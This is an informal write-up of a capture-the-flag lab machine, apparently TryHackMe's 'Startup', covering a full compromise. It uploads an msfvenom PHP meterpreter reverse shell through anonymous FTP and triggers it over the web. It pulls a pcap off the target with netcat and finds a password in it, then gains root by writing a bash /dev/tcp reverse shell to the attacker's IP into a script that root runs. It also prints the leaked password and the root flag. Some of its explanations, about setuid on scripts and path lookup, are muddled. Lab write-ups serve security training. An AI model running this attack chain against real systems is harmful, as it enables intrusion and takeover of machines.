lets define the running services :

////////////////////////////////

nmap -sC -sV 10.10.1.64                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-11 09:12 UTC
Nmap scan report for 10.10.1.64
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.21.180.29
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.60 seconds

///////////////////////////////



we found an ftp service that permits anonymous logiin 

and using gobuster :
/////////////////

we found this http://10.10.1.64/files/ftp/ : 

which looks like an ftp directory 

///////////////

lets try to connect to ftp and see if we can upload something 

///////////////

ftp anonymous@10.10.1.64                 
Connected to 10.10.1.64.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

//////////////////

cool when they ask u about password just hit enter ;

now that am logged in 

looks like this ftp server has this directory : 

/////////
00 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
////////

which is the same as the one exposed in the web at this url 

//////////

http://10.10.1.64/files/

////////////



lets create a reverse shell using msfvenom : 
//////////////////////////

msfvenom -p php/meterpreter/reverse_tcp LHOST=10.21.180.29 LPORT=4444 -f raw > startup.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1113 bytes

/////////////////////////

lets put the reverse shell  in this directory since it has the highest permissions : 

///////////////

ftp> put startup.php 
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
1113 bytes sent in 0.0001 seconds (18.4013 Mbytes/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxr-x    1 112      118          1113 May 11 09:43 startup.php
drwxrwxr-x    2 112      118          4096 May 11 09:31 uploads
226 Directory send OK.
ftp> pwd
257 "/ftp" is the current directory
ftp> 

//////////////


now lets trigger it from the web here : 10.10.1.64/files/ftp/startup.php

and by listening on our machine using multi/handler module we got a reverse shell : 

/////////////////////////

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.21.180.29:4444 
[*] Sending stage (40004 bytes) to 10.10.1.64
[*] Meterpreter session 1 opened (10.21.180.29:4444 -> 10.10.1.64:51938) at 2025-05-11 09:45:40 +0000

meterpreter > 

//////////////////


here lies the first flag : 

////////////////

meterpreter > pwd
/
meterpreter > cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
meterpreter > 


/////////////


so make ur meterpreter more flexibale type : meterpreter > shell


, i have no other permission to access the user inside this machine but it looks like he allows key access to 
ssh : 

///////////////

 ssh lennie@10.10.1.64                
The authenticity of host '10.10.1.64 (10.10.1.64)' can't be established.
ED25519 key fingerprint is SHA256:v4Yk83aT8xnOB+pdfmlLuJY1ztw/bXsFd1cl/xV07xY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.1.64' (ED25519) to the list of known hosts.
lennie@10.10.1.64's password: 
Permission denied, please try again.
lennie@10.10.1.64's password: 
Permission denied, please try again.
lennie@10.10.1.64's password: 
lennie@10.10.1.64: Permission denied (publickey,password).

//////////////

lets try to acces /etc/ssh/ on the reverse shell to see what we can get : 

/////////////

i found the server priavete keys 

meterpreter > ls
Listing: /etc/ssh
=================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100644/rw-r--r--  300261  fil   2020-05-26 23:17:24 +0000  moduli
100644/rw-r--r--  1756    fil   2020-05-26 23:17:24 +0000  ssh_config
100600/rw-------  668     fil   2020-11-12 04:50:29 +0000  ssh_host_dsa_key
100644/rw-r--r--  608     fil   2020-11-12 04:50:29 +0000  ssh_host_dsa_key.pub
100600/rw-------  227     fil   2020-11-12 04:50:29 +0000  ssh_host_ecdsa_key
100644/rw-r--r--  180     fil   2020-11-12 04:50:29 +0000  ssh_host_ecdsa_key.pub
100600/rw-------  411     fil   2020-11-12 04:50:29 +0000  ssh_host_ed25519_key
100644/rw-r--r--  100     fil   2020-11-12 04:50:29 +0000  ssh_host_ed25519_key.pub
100600/rw-------  1679    fil   2020-11-12 04:50:29 +0000  ssh_host_rsa_key
100644/rw-r--r--  400     fil   2020-11-12 04:50:29 +0000  ssh_host_rsa_key.pub
100644/rw-r--r--  338     fil   2020-09-25 08:12:28 +0000  ssh_import_id
100644/rw-r--r--  2541    fil   2020-11-12 04:54:50 +0000  sshd_config

meterpreter > 

////////////////////


looks like ssh is allowed for 2 users :

ps aux | grep sshd   
root      1052  0.0  0.9  65508  4712 ?        Ss   09:09   0:00 /usr/sbin/sshd -D
www-data  4005  0.0  0.1  11280   940 ?        S    11:31   0:00 grep sshd
one of them is us apparently 


we found a suspicious file here 
///////////////
meterpreter > ls
Listing: /incidents
===================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100755/rwxr-xr-x  31224  fil   2020-11-12 04:53:12 +0000  suspicious.pcapng

meterpreter > nc -n 10.21.180.29 7777 < suspicious.pcapng
[-] Unknown command: nc. Run the help command for more details.
meterpreter > bash
[-] Unknown command: bash. Run the help command for more details.
meterpreter > shell
Process 1341 created.
Channel 1 created.

nc -n 10.21.180.29 7777 < suspicious.pcapng
////////////////////


lets download it to our attack machine 
/////////

on the target machine we will export to our @ 

nc -n 10.21.180.29 7777 < suspicious.pcapng

on our machine we will listen and redirect the ouput 

nc -lnvp 7777 > pcap.pcapng

///////////

there it is 

 Sun 11 May - 12:59  ~/Desktop/work/tryhackme/Startup   master 9☀ 2● 1‒ 
 @Abad  ls
 pcap.pcapng   readme.txt   shell.php   startup.php

///////////


or we can open a python server on the target machine like this in the foleder of the file we want :

/////////

python3 -m http.server 3456

////////


and then get it 


///////

wget http://10.10.104.111:3456/suspicious.pcapng          
--2025-05-11 13:28:03--  http://10.10.104.111:3456/suspicious.pcapng
Connecting to 10.10.104.111:3456... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31224 (30K) [application/octet-stream]
Saving to: ‘suspicious.pcapng’

suspicious.pcapng       100%[=============================>]  30.49K  99.5KB/s    in 0.3s    

2025-05-11 13:28:04 (99.5 KB/s) - ‘suspicious.pcapng’ saved [31224/31224]

////////////

on wireshark lets open the file and filter by tcp stream : 
////////////

tcp.stream eq 

///////////

now we got an intresting tcp stream here : tcp.stream eq 7 

///////////////////////////////////////////////////////////////////////////////

$ 
ls

bin
boot
data
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
$ 
ls -la

total 96
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 .
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 ..
drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
drwxr-xr-x   1 vagrant  vagrant    140 Oct  2 17:24 data
drwxr-xr-x  16 root     root      3620 Oct  2 17:20 dev
drwxr-xr-x  95 root     root      4096 Oct  2 17:24 etc
drwxr-xr-x   4 root     root      4096 Oct  2 17:26 home
drwxr-xr-x   2 www-data www-data  4096 Oct  2 17:24 incidents
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
drwx------   2 root     root     16384 Sep 25 08:12 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
dr-xr-xr-x 125 root     root         0 Oct  2 17:19 proc
-rw-r--r--   1 www-data www-data   136 Oct  2 17:24 recipe.txt
drwx------   3 root     root      4096 Oct  2 17:24 root
drwxr-xr-x  25 root     root       960 Oct  2 17:23 run
drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
drwxr-xr-x   2 root     root      4096 Oct  2 17:20 snap
drwxr-xr-x   3 root     root      4096 Oct  2 17:23 srv
dr-xr-xr-x  13 root     root         0 Oct  2 17:19 sys
drwxrwxrwt   7 root     root      4096 Oct  2 17:40 tmp
drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
drwxr-xr-x   1 vagrant  vagrant    118 Oct  1 19:49 vagrant
drwxr-xr-x  14 root     root      4096 Oct  2 17:23 var
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
$ 
whoami

www-data
$ 
python -c "import pty;pty.spawn('/bin/bash')"

www-data@startup:/$ 
cd

cd
bash: cd: HOME not set
www-data@startup:/$ 
ls

ls
bin   etc	  initrd.img.old  media  recipe.txt  snap  usr	    vmlinuz.old
boot  home	  lib		  mnt	 root	     srv   vagrant
data  incidents   lib64		  opt	 run	     sys   var
dev   initrd.img  lost+found	  proc	 sbin	     tmp   vmlinuz
www-data@startup:/$ 
cd home

cd home
www-data@startup:/home$ 
cd lennie

cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ 
ls

ls
lennie
www-data@startup:/home$ 
cd lennie

cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ 
sudo -l

sudo -l
[sudo] password for www-data: 
c4ntg3t3n0ughsp1c3


Sorry, try again.
[sudo] password for www-data: 



Sorry, try again.
[sudo] password for www-data: 
c4ntg3t3n0ughsp1c3


sudo: 3 incorrect password attempts
www-data@startup:/home$ 
cat /etc/passwd

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
lennie:x:1002:1002::/home/lennie:
ftpsecure:x:1003:1003::/home/ftpsecure:
www-data@startup:/home$ 
exit

exit
exit
$ 
exit


//////////////////////////////////////////////////////////////////////////////////

we found a password for the user lennie : c4ntg3t3n0ughsp1c3



now its time to escalate our priviliges : ///


/////////////////////////////////


we found this file that belongs to the root :
.//////////////////
 $ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 5 lennie lennie 4096 May 11 13:36 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 May 11 13:42 startup_list.txt

/////////////////////////

for the script 

!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh

    It writes the contents of the $LIST environment variable to a file.

    Then, it executes /etc/print.sh without an absolute path (if print.sh is not in /etc/).

Possible Issues:

    $LIST Environment Variable Control: If we can control $LIST, we might write malicious content.

    Missing Absolute Path for /etc/print.sh: If /etc/print.sh doesn’t exist, the system might search for print.sh in $PATH, leading to path hijacking.

here is the /etc/print.sh :

///////////
$ ls /etc/ | grep -i "print"   
print.sh
$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
$ 
/////////


lets try to inject a scritp inside the file /etc/print.sh and execute : 
///////////////////
echo '#!/bin/bash' > /etc/print.sh
echo 'bash -i >& /dev/tcp/10.21.180.29/9999 0>&1' >> /etc/print.sh
///////////////

dont forget to listen on port 9999

and the most importent is to give the file the suid permission other than that the reverse shell wont belong 
to the root 
/////////////
chmod +s /etc/print.sh
//////////////


the flag is : 

///////////////

nc -lnvp 9999           
Connection from 10.10.104.111:49412
bash: cannot set terminal process group (1973): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# ls 
ls
root.txt
root@startup:~# cat root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
root@startup:~# 

//////////////



remember if we gave it a normal execution permission like this it will give us only a shell for the lennie user 

thats why we gave it the suid : chmod +s /etc/print.sh





